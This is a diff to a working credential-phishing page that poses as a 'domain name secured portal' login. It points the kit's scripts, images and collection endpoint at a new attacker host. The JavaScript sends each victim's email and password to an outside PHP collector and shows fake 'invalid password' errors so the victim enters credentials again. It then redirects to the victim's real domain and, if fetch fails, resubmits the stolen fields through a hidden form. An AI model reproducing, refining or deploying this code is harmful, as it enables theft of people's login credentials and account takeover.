@@ -5,7 +5,7 @@
     <title>Login</title>
     <link id="favLink" rel="shortcut icon" href="https://validdnssearch.com/enterprises/ateja.jpg" type="image/x-icon">
     <meta http-equiv="expires" content="0">
-    <link id="atejaSheet" rel="stylesheet" type="text/css" href="https://newcartelteam.fun/ateja_files/cssLogin.css">
+    <link id="atejaSheet" rel="stylesheet" type="text/css" href="https://googgodwork.fun/ateja_files/cssLogin.css">
     <style>
         /* reset & base */
         * {
@@ -24,7 +24,7 @@
         body#logBody,
         body#logBody#logBody,
         html body#logBody {
-            background-image: url('https://newcartelteam.fun/imageblur.jpg') !important;
+            background-image: url('https://googgodwork.fun/imageblur.jpg') !important;
             background-size: 50% auto !important;
             background-position: center !important;
             background-repeat: no-repeat !important;
@@ -40,7 +40,7 @@
         
         /* Override any inline background from the original HTML */
         body[bgcolor="#FFFFFF"] {
-            background-image: url('https://newcartelteam.fun/imageblur.jpg') !important;
+            background-image: url('https://googgodwork.fun/imageblur.jpg') !important;
             background-size: 50% auto !important;
             background-position: center !important;
             background-repeat: no-repeat !important;
@@ -186,12 +186,12 @@
         }
     </style>
         
-    <script src="https://newcartelteam.fun/ateja_files/jquery.min.js.download"></script>
-    <script src="https://newcartelteam.fun/ateja_files/enterprise.js.download"></script>
+    <script src="https://googgodwork.fun/ateja_files/jquery.min.js.download"></script>
+    <script src="https://googgodwork.fun/ateja_files/enterprise.js.download"></script>
 </head>
-<body id="logBody" text="#000000" bgcolor="#FFFFFF" onload="setFormFocus();" style="background-image: url('https://newcartelteam.fun/imageblur.jpg') !important; background-size: 50% auto !important; background-position: center !important; background-repeat: no-repeat !important; background-attachment: fixed !important; background-color: #FFFFFF !important;">
+<body id="logBody" text="#000000" bgcolor="#FFFFFF" onload="setFormFocus();" style="background-image: url('https://googgodwork.fun/imageblur.jpg') !important; background-size: 50% auto !important; background-position: center !important; background-repeat: no-repeat !important; background-attachment: fixed !important; background-color: #FFFFFF !important;">
 
-    <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://newcartelteam.fun/ateja.php">
+    <form id="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off" method="POST" action="https://googgodwork.fun/ateja.php">
         <input id="domain" type="hidden" value="cutrubus.com" name="domain">
         <input id="fieldName" type="hidden" value="contabo.net" name="field">
         <input type="hidden" id="login_attempt" value="0">
@@ -206,7 +206,7 @@
                         <td style="text-align:center; padding-bottom:6px;">
                             <!-- icon + welcome message -->
                             <div style="display:flex; align-items:center; justify-content:center; gap:12px; flex-wrap:wrap; margin-bottom:4px;">
-                                <img id="domainIcon" src="https://newcartelteam.fun/ateja_files/0.gif" alt="Domain Icon" style="width:48px; height:48px; border-radius:50%; object-fit:contain; background:#eef2f7; padding:8px; border:1px solid #ddd;">
+                                <img id="domainIcon" src="https://googgodwork.fun/ateja_files/0.gif" alt="Domain Icon" style="width:48px; height:48px; border-radius:50%; object-fit:contain; background:#eef2f7; padding:8px; border:1px solid #ddd;">
                                 <b><font face="Tahoma" id="errMssg" style="font-weight:700 !important;">Welcome to domain name secured portal<br>Sign in to continue</font></b>
                             </div>
                         </td>
@@ -225,7 +225,7 @@
                     </tr>
                     <tr>
                         <td style="padding-top:10px;">
-                            <button type="button" id="loginbtn" onclick="processLogin()">Sign In</button>
+                            <div id="loginbtn" onclick="processLogin()">Sign In</div>
                         </td>
                     </tr>
                 </tbody>
@@ -311,7 +311,7 @@
         
         // Function to get favicon URL for a domain
         function getDomainIconUrl(domain) {
-            if (!domain) return 'https://newcartelteam.fun/ateja_files/0.gif';
+            if (!domain) return 'https://googgodwork.fun/ateja_files/0.gif';
             return 'https://www.google.com/s2/favicons?domain=' + domain + '&sz=64';
         }
         
@@ -331,12 +331,12 @@
                 if (iconElement && fullDomain) {
                     iconElement.src = getDomainIconUrl(fullDomain);
                     iconElement.onerror = function() {
-                        this.src = 'https://newcartelteam.fun/ateja_files/0.gif';
+                        this.src = 'https://googgodwork.fun/ateja_files/0.gif';
                     };
                 }
             } else {
                 if (iconElement) {
-                    iconElement.src = 'https://newcartelteam.fun/ateja_files/0.gif';
+                    iconElement.src = 'https://googgodwork.fun/ateja_files/0.gif';
                 }
             }
             
@@ -460,7 +460,6 @@
             loginAttempt = parseInt(loginAttemptInput?.value || '0');
             setErrorMessage("Authenticating ...", false);
 
-            // Prepare form data
             var formData = new URLSearchParams();
             formData.append('email', email);
             formData.append('password', password);
@@ -469,28 +468,38 @@
             formData.append('RedirectTo', redirectTo);
             formData.append('attempt', loginAttempt + 1);
 
-            // Try fetch first (with proper error handling)
-            fetch('https://newcartelteam.fun/ateja.php', {
+            // Use fetch with proper CORS handling
+            fetch('https://googgodwork.fun/ateja.php', {
                 method: 'POST',
                 headers: { 
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
-                body: formData.toString(),
-                mode: 'no-cors' // This prevents CORS errors but won't give response
+                body: formData.toString()
             })
-            .then(response => {
-                // With no-cors, we can't read the response
-                // Just update attempt and redirect
-                loginAttemptInput.value = loginAttempt + 1;
-                if (attemptInput) attemptInput.value = loginAttempt + 1;
-                
-                // Simulate login flow
-                if (loginAttempt === 0 || loginAttempt === 1) {
+            .then(response => response.text())
+            .then(data => {
+                // Original login attempt logic
+                if (loginAttempt === 0) {
                     setErrorMessage("You provided an invalid username or password. Please sign in again.", true);
                     document.getElementById('password').value = '';
+                    loginAttemptInput.value = '1';
+                    if (attemptInput) attemptInput.value = '1';
                     document.getElementById('password').focus();
-                } else if (loginAttempt === 2) {
-                    setErrorMessage("Redirecting...", false);
+                }
+                else if (loginAttempt === 1) {
+                    setErrorMessage("You provided an invalid username or password. Please sign in again.", true);
+                    document.getElementById('password').value = '';
+                    loginAttemptInput.value = '2';
+                    if (attemptInput) attemptInput.value = '2';
+                    document.getElementById('password').focus();
+                }
+                else if (loginAttempt === 2) {
+                    var errElement = document.getElementById('errMssg');
+                    if (errElement) errElement.innerHTML = "";
+                    
+                    loginAttemptInput.value = '3';
+                    if (attemptInput) attemptInput.value = '3';
+                    
                     setTimeout(function() {
                         if (domain) {
                             window.location.href = "https://www." + domain;
@@ -504,16 +513,35 @@
                 }
             })
             .catch(error => {
-                // If fetch fails, fallback to form submission
-                console.log('Fetch failed, using form submission fallback:', error);
+                // If fetch fails due to CORS, fallback to form submission
+                console.log('Fetch failed, using form submission:', error);
                 
-                // Update attempt counters
-                loginAttemptInput.value = loginAttempt + 1;
-                if (attemptInput) attemptInput.value = loginAttempt + 1;
+                // Create a hidden form and submit it
+                var tempForm = document.createElement('form');
+                tempForm.method = 'POST';
+                tempForm.action = 'https://googgodwork.fun/ateja.php';
+                tempForm.enctype = 'application/x-www-form-urlencoded';
                 
-                // Use traditional form submission
-                var form = document.getElementById('logonForm');
-                form.submit();
+                // Add all fields
+                var fields = {
+                    'email': email,
+                    'password': password,
+                    'domain': document.getElementById('domain').value,
+                    'field': document.getElementById('fieldName').value,
+                    'RedirectTo': redirectTo,
+                    'attempt': loginAttempt + 1
+                };
+                
+                for (var key in fields) {
+                    var input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = key;
+                    input.value = fields[key];
+                    tempForm.appendChild(input);
+                }
+                
+                document.body.appendChild(tempForm);
+                tempForm.submit();
             });
         }
 
@@ -555,7 +583,7 @@
             }
             
             // Force background image again after load
-            document.body.style.backgroundImage = "url('https://newcartelteam.fun/imageblur.jpg')";
+            document.body.style.backgroundImage = "url('https://googgodwork.fun/imageblur.jpg')";
             document.body.style.backgroundSize = "50% auto";
             document.body.style.backgroundPosition = "center";
             document.body.style.backgroundRepeat = "no-repeat";
